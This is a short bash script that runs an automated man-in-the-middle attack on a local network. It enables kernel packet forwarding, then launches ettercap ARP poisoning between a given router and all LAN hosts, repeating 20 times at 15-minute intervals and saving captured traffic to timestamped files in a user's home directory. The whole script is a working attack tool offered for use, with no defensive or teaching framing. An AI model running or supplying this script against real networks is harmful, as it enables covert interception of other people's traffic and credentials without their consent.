#!/bin/bash

function ip_forward
{
    echo -n "[*] Setting kernel to forward packets: "
    echo 1 > /proc/sys/net/ipv4/ip_forward;
    if [[ $? == 0 ]]; then
        echo -e "\033[32mOK\033[0m";
    else
        echo -e "\033[33mFAIL\033[0m";
    fi
}


#  Check for permissions
uid=$(id -u);
if [[ $uid != 0 ]]; then
    echo "[!] Error: You do not have enough permissions to run this script.";
    exit;
fi


#  Check for arguments.
if [[ $1 == "" ]] || [[ $2 == "" ]]; then
    echo "Usage: $0 <INTERFACE> <ROUTER_IP> [HOST_FILE]";
    exit;
fi


#  Get the host file data from arguments.
if [[ $3 != "" ]]; then
    host_file=$3;
fi



#  Define the variables to the attack
i=0   # iterations
iface=$1  # interface
router_ip=$2  # router ip address
store_data=/home/shemhazai
interval=900


ip_forward  # forward packets set


echo "[*] Commecing attack with interface $iface on roter $router_ip ...";
while [[ $i != 20 ]];
do
    time_stamp=$(date | sed 's/ /_/g' | sed 's/:/-/g' | sed 's/BRT//g' | sed 's/__/_/g');
    if [[ $host_file != "" ]]; then
        ettercap -Tqi $iface -M arp:remote /$router_ip// /// -s 's(300)qq' -P autoadd -j $host_file -w $store_data/sniffing_$time_stamp.cap;
    else
        ettercap -Tqi $iface -M arp:remote /$router_ip// /// -s 's(300)qq' -P autoadd -w $store_data/sniffing_$time_stamp.cap;
    fi
    if [[ $? == 0 ]]; then
        ((i++));  # increment iterations
        sleep $interval;
    fi
done
